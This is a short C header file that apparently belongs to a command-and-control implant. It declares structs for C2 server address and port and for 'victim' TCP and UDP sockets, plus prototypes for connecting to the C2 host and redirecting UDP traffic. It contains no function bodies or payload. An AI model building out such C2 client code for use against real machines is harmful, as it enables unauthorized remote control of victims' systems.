// Copyright (c) 2026 Kloveme
// SPDX-License-Identifier: MIT
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

#define socket_t int

struct c2_config_data {
    char *c2_ip;
    int c2_port;
    int udp_port;
};

struct tcp_socket_data {
    socket_t tcp_victim_sock;
    struct sockaddr_in tcp_victim_sock_addr;
};

struct udp_socket_data {
    socket_t udp_victim_sock;
    struct sockaddr_in udp_victim_sock_addr;
};

extern void init_socket(struct tcp_socket_data* tcp_sock_d , 
    struct udp_socket_data* udp_sock_d);
extern void config_c2_connection(char *c2_ip , int c2_port , 
    int victim_udp_port , struct c2_config_data* c2_config_d);
extern void config_socket(struct tcp_socket_data* tcp_sock_d , 
    struct udp_socket_data* udp_sock_d , 
    struct c2_config_data* c2_config_d);
extern int tcp_connection_c2(struct tcp_socket_data* tcp_sock_d);
extern int udp_bind(struct udp_socket_data* udp_sock_d);
extern void config_udp_redirect(struct tcp_socket_data* tcp_sock_d , struct udp_socket_data* udp_sock_d);